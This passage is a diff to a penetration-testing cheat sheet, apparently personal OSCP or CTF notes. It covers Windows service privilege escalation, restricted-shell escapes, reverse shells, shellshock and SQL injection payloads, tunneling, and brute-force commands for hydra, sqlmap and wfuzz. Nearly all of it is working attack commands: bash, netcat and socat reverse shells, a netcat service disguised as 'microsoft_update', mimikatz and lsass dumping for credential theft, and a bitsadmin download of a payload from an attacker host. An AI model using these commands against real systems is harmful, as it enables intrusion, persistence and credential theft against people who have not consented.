-      look for services with SERVICE_ALL_ACCESS flag set
-    sc qc <servicename>
-      get more details about the service
-      make sure service has no dependencies
-      change start type to ondemand
-      use netcat to get a reverse shell connection
-      sc config <servicename> start= "demand"
-      sc config <servicename> binpath= "C:\Users\User\Desktop\nc.exe -n <targetip> <attackerport> -e C:\WINDOWS\System32\cmd.exe"
-      sc config <servicename> obj= ".\LocalSystem" password= ""
-      net start <servicename>
-  password mining:
-    registry:
-    logs
-    .rdp files
-    memory:
-    configuration files:
-    cached SAM
-  registry:
-    autorun
-    AlwaysInstallElevated
-  scheduled tasks:
-    binary overwrite
-    missing binary
-```  
 ### restricted shells [🡑](#tips)  
 ```
 rbash:
-bash -i
-BASH_CMDS[poop]=/bin/bash;poop
+  bash -i
+  BASH_CMDS[foobar]=/bin/bash;foobar
 lshell:
-echo os.system("/bin/bash")
+  echo os.system("/bin/bash")
 ```  
-### reverse shell generator [🡑](#tips)  
+### reverse shell [🡑](#tips)  
 ```
-
-```  
-### shell [🡑](#tips)  
-```
-http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 reverse tcp shell from bash:
-/bin/bash -i >& /dev/tcp/<targetip>/<attackerport> 0>&1
+  /bin/bash -i >& /dev/tcp/<targetip>/<attackerport> 0>&1
 make a partially interactive terminal usable:
-target: python -c "import pty; pty.spawn('/bin/bash')"
-local: stty raw -echo ; fg
-target: reset ; export SHELL=bash ; export TERM=xterm ; stty size ; stty -rows 45 -columns 90 ; stty size
+  target: python -c "import pty; pty.spawn('/bin/bash')"
+local:
+  stty raw -echo ; fg
+target:
+  reset ; export SHELL=bash ; export TERM=xterm ; stty size ; stty -rows 45 -columns 90 ; stty size
 reverse php shell on windows:
-https://raw.githubusercontent.com/Dhayalanb/windows-php-reverse-shell/master/Reverse%20Shell.php
+  https://raw.githubusercontent.com/Dhayalanb/windows-php-reverse-shell/master/Reverse%20Shell.php
 ```  
 ### shellcode [🡑](#tips)  
 ```
@@ -2921,23 +2499,81 @@ https://raw.githubusercontent.com/Dhayalanb/windows-php-reverse-shell/master/Rev
 look for /cgi-bin/ directory (incldue 403 code for gobuster scan)
 check for scripts (-x sh,pl) using gobuster
 test http header, user-agent probably
-curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://shocker.htb/cgi-bin/user.sh
-gobuster -u 10.10.10.56 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -s 200,204,301,302,307,403
-gobuster -u 10.10.10.56 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -s 200,204,301,302,307,403 -k -x sh,pl,py
-nmap -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=ls 10.10.10.56
+curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://<targetip>/cgi-bin/user.sh
+gobuster -u <targetip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -s 200,204,301,302,307,403
+gobuster -u <targetip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -s 200,204,301,302,307,403 -k -x sh,pl,py
+nmap -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=ls <targetip>
 ```  
-### sqli [🡑](#tips)  
+### sql injection [🡑](#tips)  
 ```
 manual verification:
-' or 1=1 -- -
-' || 1=1 #
-find a row where you can place your output: http://<targetip>/inj.php?id=1 union all select 1,2,3,4,5,6,7,8
-get db version: http://<targetip>/inj.php?id=1 union all select 1,2,3,@@version,5
-get current user: http://<targetip>/inj.php?id=1 union all select 1,2,3,user(),5
-see all tables: http://<targetip>/inj.php?id=1 union all select 1,2,3,table_name,5 from information_schema.tables
-get column names for a specified table: http://<targetip>/inj.php?id=1 union all select 1,2,3,column_name,5 from information_schema.columns where table_name='users'
-concat user names and passwords: http://<targetip>/inj.php?id=1 union all select 1,2,3,concat(name, 0x3a , password),5 from users
-write to a file: http://<targetip>/inj.php?id=1 union all select 1,2,3,"content",5 into outfile 'outfile'
+  ' or 1=1 -- -
+  ' || 1=1 #
+  or 1=1
+  or 1=1--
+  or 1=1#
+  or 1=1/*
+  admin' --
+  admin' #
+  admin'/*
+  admin' or '1'='1
+  admin' or '1'='1'--
+  admin' or '1'='1'#
+  admin' or '1'='1'/*
+  admin'or 1=1 or ''='
+  admin' or 1=1
+  admin' or 1=1--
+  admin' or 1=1#
+  admin' or 1=1/*
+  admin') or ('1'='1
+  admin') or ('1'='1'--
+  admin') or ('1'='1'#
+  admin') or ('1'='1'/*
+  admin') or '1'='1
+  admin') or '1'='1'--
+  admin') or '1'='1'#
+  admin') or '1'='1'/*
+  1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+  admin" --
+  admin" #
+  admin"/*
+  admin" or "1"="1
+  admin" or "1"="1"--
+  admin" or "1"="1"#
+  admin" or "1"="1"/*
+  admin"or 1=1 or ""="
+  admin" or 1=1
+  admin" or 1=1--
+  admin" or 1=1#
+  admin" or 1=1/*
+  admin") or ("1"="1
+  admin") or ("1"="1"--
+  admin") or ("1"="1"#
+  admin") or ("1"="1"/*
+  admin") or "1"="1
+  admin") or "1"="1"--
+  admin") or "1"="1"#
+  admin") or "1"="1"/*
+  1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
+find a row where you can place your output:
+  http://<targetip>/inj.php?id=1 union all select 1,2,3,4,5,6,7,8
+get db version:
+  http://<targetip>/inj.php?id=1 union all select 1,2,3,@@version,5
+get current user:
+  http://<targetip>/inj.php?id=1 union all select 1,2,3,user(),5
+see all tables:
+  http://<targetip>/inj.php?id=1 union all select 1,2,3,table_name,5 from information_schema.tables
+get column names for a specified table:
+  http://<targetip>/inj.php?id=1 union all select 1,2,3,column_name,5 from information_schema.columns where table_name='users'
+concat user names and passwords:
+  http://<targetip>/inj.php?id=1 union all select 1,2,3,concat(name, 0x3a , password),5 from users
+write to a file:
+  http://<targetip>/inj.php?id=1 union all select 1,2,3,"content",5 into outfile 'outfile'
+```  
+### startup scripts [🡑](#tips)  
+```
+chmod +x /foo/bar
+update-rc.d /foo/bar defaults
 ```  
 ### stegnography [🡑](#tips)  
 ```
@@ -2945,15 +2581,39 @@ strings
 exiftool
 steghide
 ```  
+### tmux shortcuts [🡑](#tips)  
+```
+prefix: ctrl + b
+toggle logging: prefix + shift + p
+screen cap: prefix + alt + p
+complete history: prefix + alt + shift + p
+```  
 ### tunneling [🡑](#tips)  
 ```
-connect via squid proxy @ 3128/tcp on 192.168.1.24, redirect to ssh service on localhost, run a local standalone daemon on 1234/tcp
-proxytunnel -p <targetip>:3128 -d 127.0.0.1:22 -a 1234
-ssh john@127.0.0.1 /bin/bash
-vim /etc/proxychains.conf
-  http <targetip> 3128
-proxychains nmap -sT -p22 <targetip>
-proxychains ssh john@<targetip> /bin/bash
+connect via squid proxy @ 3128/tcp on <targetip>, redirect to ssh service on localhost, run a local standalone daemon on <targetport>:
+  proxytunnel -p <targetip>:<targetport> -d 127.0.0.1:22 -a 1234
+  ssh john@127.0.0.1 /bin/bash
+  vim /etc/proxychains.conf
+    http <targetip> <targetport>
+  proxychains nmap -sT -p22 <targetip>
+  proxychains ssh <username>@<targetip> /bin/bash
+forward remote port to local address:
+  plink.exe -P 22 -l root -pw "<password>" -R 445:127.0.0.1:445 <targetip>
+```  
+### windows useful commands [🡑](#tips)  
+```
+net localgroup Users
+net localgroup Administrators
+search dir/s *.doc
+system("start cmd.exe /k $cmd")
+sc create microsoft_update binpath="cmd /K start c:\nc.exe -d <targetip> <targetport> -e cmd.exe" start= auto error= ignore /c C:\nc.exe -e c:\windows\system32\cmd.exe -vv <targetip> <targetport>
+mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords full"
+procdump.exe -accepteula -ma lsass.exe lsass.dmp
+mimikatz.exe "sekurlsa::minidump lsass.dmp" "log" "sekurlsa::logonpasswords"
+C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp ## for 32 bits
+C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp ## for 64 bits
+bitsadmin /transfer mydownloadjob /download /priority normal http://<attackerip>/payload.exe C:\\Users\\%USERNAME%\\AppData\\local\\temp\\payload.exe
+powershell history: type C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 ```  
 
 
@@ -2961,8 +2621,8 @@ proxychains ssh john@<targetip> /bin/bash
 ## 💥 Tools [↟](#contents)
 ### burp [🡑](#tools)  
 ```
-set an upstream proxy within burp
-burp > user options > upstream proxy > 192.168.92.146:3128
+set an upstream proxy within burp:
+  burp > user options > upstream proxy > <targetip>:<targetport>
 ```  
 ### cewl [🡑](#tools)  
 ```
@@ -2971,7 +2631,7 @@ cewl www.megacorpone.com -m 6 -w /root/newfilelist.txt 2>/dev/null
 ### fcrackzip [🡑](#tools)  
 ```
 fcrackzip -uDp /usr/share/wordlists/rockyou.txt <file.zip>
-unzip -o -P "password" ,file.zip>
+unzip -o -P "password" <file.zip>
 ```  
 ### gobuster [🡑](#tools)  
 ```
@@ -2985,72 +2645,73 @@ full/comprehensive:
   gobuster -s 200,204,301,302,307,403 -u http://<targetip> -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 80 -a 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0'
 ippsec:
   gobuster -u http://<targetip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s 200,204,301,302,307,403 -k -x txt,php,asp
-  gobuster -u 10.10.10.56 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -s 200,204,301,302,307,403 -k -x sh,pl
+  gobuster -u http://<targetip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -s 200,204,301,302,307,403 -k -x sh,pl
 cgi list:
   /usr/share/seclists/Discovery/Web-Content/CGIs.txt
 ```  
 ### hashcat [🡑](#tools)  
 ```
-hashcat -a 0 -m 0 d60dffed7cc0d87e1f4a11aa06ca73af /usr/share/wordlists/rockyou.txt
+hashcat -a 0 -m 0 <hash> /usr/share/wordlists/rockyou.txt
 ```  
 ### hydra [🡑](#tools)  
 ```
 generic:
-hydra -ufl /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt <targetip>
+  hydra -ufl /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt <targetip>
 ftp:
-hydra -t 4 -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt 192.168.13.236 ftp
+  hydra -t 4 -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt <targetip> ftp
 http:
-hydra -l admin -P /root/ctf_wordlist.txt kioptrix3.com http-post-form "/admin.php:u=^USER^&p=^PASS^&f=login:'Enter your username and password to continue'" -V
-with cookie: hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.92.110 -V http-get '/dir/page.php?name=^USER^&pass=^PASS^&submit=Log In:F=Incorrect:H=Cookie: insert stuff here'
+  hydra -l admin -P /root/ctf_wordlist.txt kioptrix3.com http-post-form "/admin.php:u=^USER^&p=^PASS^&f=login:'Enter your username and password to continue'" -V
+with cookie:
+  hydra -l user -P /usr/share/wordlists/rockyou.txt <targetip> -V http-get '/dir/page.php?name=^USER^&pass=^PASS^&submit=Log In:F=Incorrect:H=Cookie: insert stuff here'
 pop3:
-hydra -l root -P /usr/share/wordlists/rockyou.txt <targetip> pop3
+  hydra -l root -P /usr/share/wordlists/rockyou.txt <targetip> pop3
 rdp:
-hydra -t 4 -V -l root -P /usr/share/wordlists/rockyou.txt rdp://<targetip>
+  hydra -t 4 -V -l root -P /usr/share/wordlists/rockyou.txt rdp://<targetip>
 smtp:
-hydra -s 25 -v -V -l root@ucal.local -P /usr/share/wordlists/rockyou.txt -t 1 -w 20 -f <targetip> smtp
+  hydra -s 25 -v -V -l root@ucal.local -P /usr/share/wordlists/rockyou.txt -t 1 -w 20 -f <targetip> smtp
 ssh:
-hydra -l root -P /usr/share/wordlists/rockyou.txt <targetip> ssh
-hydra -t 4 -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt <targetip> ssh
-hydra -t 4 -L /usr/share/wordlists/rockyou.txt -p some_passsword <targetip> ssh
+  hydra -l root -P /usr/share/wordlists/rockyou.txt <targetip> ssh
+  hydra -t 4 -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt <targetip> ssh
+  hydra -t 4 -L /usr/share/wordlists/rockyou.txt -p some_passsword <targetip> ssh
 wordpress:
-hydra -l elliot -P ./fsocity.dic <targetip> http-post-form "/wp-login.php:log=elliot&pwd=^PASS^:ERROR"
+  hydra -l elliot -P ./fsocity.dic <targetip> http-post-form "/wp-login.php:log=elliot&pwd=^PASS^:ERROR"
 ```  
 ### john [🡑](#tools)  
 ```
 create custom wordlist:
-john --wordlist=megacorpone-cewl --rules --stdout >megacorpone-cewl-jtr
+  john --wordlist=megacorpone-cewl --rules --stdout >megacorpone-cewl-jtr
 crack shadow hashes:
-unshadow passwd shadow >unshadowed ; john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed ; john --show unshadowed
+  unshadow passwd shadow >unshadowed ; john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed ; john --show unshadowed
 crack md5 hashes:
-john --wordlist=/usr/share/wordlists/rockyou.txt --format=RAW-MD5 hashes
+  john --wordlist=/usr/share/wordlists/rockyou.txt --format=RAW-MD5 hashes
 ```  
 ### kernel module [🡑](#tools)  
 ```
 rootkit:
-https://github.com/PinkP4nther/Pinkit
+  https://github.com/PinkP4nther/Pinkit
 ```  
 ### merlin c2 framework [🡑](#tools)  
 ```
 openssl req -x509 -newkey rsa:4096 -sha256 -nodes -keyout server.key -out server.crt -subj "/CN=root.kali.pwn" --days 7
-GOOS=windows GOARCH=amd64 go build -ldflags "-X main.url=https://10.10.14.19:<attackerport>" -o merlinagentx64.exe main.go
+GOOS=windows GOARCH=amd64 go build -ldflags "-X main.url=https://<targetip>:<attackerport>" -o merlinagentx64.exe main.go
 go build -o merlinagent.elf main.go
 ```  
 ### metasploit [🡑](#tools)  
 ```
-systemctl start postgresql
-systemctl status postgresql
+db_status
+load mimiktaz
+msfconsole -q
 msfdb init
 msfdb start
-msfconsole -q
-set verbose true
-db_status
 search <string>
-show options
+set payload windows/x86/meterpreter/reverse_tcp
+set verbose true
 show advanced
+show options
 show payloads
 show targets
-windows/x86/meterpreter/reverse_tcp
-load mimiktaz
+systemctl start postgresql
+systemctl status postgresql
 wdigest
 ```  
 ### msfvenom [🡑](#tools)  
@@ -3077,11 +2738,11 @@ linux reverse tcp shell elf shared object file:
 ### netcat [🡑](#tools)  
 ```
 bind:
-nc -lvp <attackerport>
+  nc -lvp <attackerport>
 connect:
-nc -nv <targetip> <attackerport>
+  nc -nv <targetip> <attackerport>
 reverse:
-nc -e /bin/bash <targetip> <attackerport>
+  nc -e /bin/bash <targetip> <attackerport>
 ```  
 ### ncrack [🡑](#tools)  
 ```
@@ -3095,7 +2756,8 @@ netdiscover -r 192.168.92.0/24
 ### nikto [🡑](#tools)  
 ```
 nikto -h http://<targetip>
-nikto -h 192.168.92.146 -useproxy http://192.168.92.146:3128
+nikto -C all -h http://IP
+nikto -h <targetip> -useproxy http://<targetip>:3128
 ```  
 ### nmap [🡑](#tools)  
 ```
@@ -3137,22 +2799,22 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<attackerip>:<attackerpo
 ### sqlmap [🡑](#tools)  
 ```
 avoid prompts, use defaults:
-sqlmap --batch
+  sqlmap --batch
 read http request from a text file (request captured from burp, useful for POST requests) and use it to start scan:
-sqlmap -r searchform.txt --dbs --batch
-sqlmap -r searchform.txt -D webapphacking --dump-all --batch
+  sqlmap -r searchform.txt --dbs --batch
+  sqlmap -r searchform.txt -D webapphacking --dump-all --batch
 post requests:
-sqlmap -u "http://example.com/" --data "a=1&b=2&c=3" -p "a,b" --method POST
+  sqlmap -u "http://example.com/" --data "a=1&b=2&c=3" -p "a,b" --method POST
 intrusive scans:
-sqlmap --level 5 --risk 3
+  sqlmap --level 5 --risk 3
 list databses:
-sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1&sort=photoid#photos" --dbs
+  sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1&sort=photoid#photos" --dbs
 list tables within a database:
-sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1&sort=photoid#photos" -D gallery --tables
+  sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1&sort=photoid#photos" -D gallery --tables
 dump a table:
-sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1&sort=photoid#photos" -D gallery -T dev_accounts --dump
+  sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1&sort=photoid#photos" -D gallery -T dev_accounts --dump
 blind sql enumeration:
-sqlmap -u "http://192.168.92.151:1337/978345210/index.php" --forms --dbs
+  sqlmap -u "http://<targetip>:<targetport>/index.php" --forms --dbs
 ```  
 ### steghide [🡑](#tools)  
 ```
@@ -3161,28 +2823,28 @@ steghide extract -sf file.jpg
 ### unicornscan [🡑](#tools)  
 ```
 scan all 64k ports:
-unicornscan -vmT <targetip>:a
+  unicornscan -vmT <targetip>:a
 scan first 1k ports:
-unicornscan -vmT <targetip>:p
+  unicornscan -vmT <targetip>:p
 scan in udp mode:
-unicornscan -vmU <targetip>
+  unicornscan -vmU <targetip>
 ```  
 ### wfuzz [🡑](#tools)  
 ```
 enumerate directories:
   wfuzz -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt "http://127.0.0.1/index.php?vuln=../FUZZ/file1.php"
-  wfuzz -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt --sc 200 -t 50 http://192.168.30.129:4480/FUZZ
-  wfuzz -w common.txt -w /usr/share/seclists/Discovery/Web-Content/web-mutations.txt --sc 200 -t 50 http://192.168.30.129:4488/FUZZ
+  wfuzz -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt --sc 200 -t 50 http://<targetip>:<targetport>/FUZZ
+  wfuzz -w common.txt -w /usr/share/seclists/Discovery/Web-Content/web-mutations.txt --sc 200 -t 50 http://<targetip>:4488/FUZZ
 enumerate directories and filter on response length:
   wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hh 158607 http://bart.htb/FUZZ
 bruteforce password:
   bruteforce a single list:
-    wfuzz -w pwds.db -d "user=pinkadmin&pass=FUZZ&pin=FUZ2Z" -t 50 --hw 6 http://192.168.30.129:4480/login.php
+    wfuzz -w pwds.db -d "user=pinkadmin&pass=FUZZ&pin=FUZ2Z" -t 50 --hw 6 http://<targetip>:<targetport>/login.php
   bruteforce multiple lists:
-    wfuzz -w pwds.db -w pins.txt -d "user=pinkadmin&pass=FUZZ&pin=FUZ2Z" -t 50 --hw 6 http://192.168.30.129:4480/login.php
+    wfuzz -w pwds.db -w pins.txt -d "user=pinkadmin&pass=FUZZ&pin=FUZ2Z" -t 50 --hw 6 http://<targetip>:<targetport>/login.php
   bruteforce multiple lists, but faster:
-    wfuzz -c -z file,./usernames.txt -z file,./pwds.db -d 'user=FUZZ&pass=FUZ2Z&pin=12345' --hh 45 http://192.168.0.74:8080/login.php
-    wfuzz -c -z file,./pin.txt -d 'user=pinkadmin&pass=AaPinkSecaAdmin4467&pin=FUZZ' --hh 45,41 http://192.168.0.74:8080/login.php
+    wfuzz -c -z file,./usernames.txt -z file,./pwds.db -d 'user=FUZZ&pass=FUZ2Z&pin=12345' --hh 45 http://<targetip>:<targetport>/login.php
+    wfuzz -c -z file,./pin.txt -d 'user=pinkadmin&pass=AaPinkSecaAdmin4467&pin=FUZZ' --hh 45,41 http://<targetip>:<targetport>/login.php
 ```  
 
 
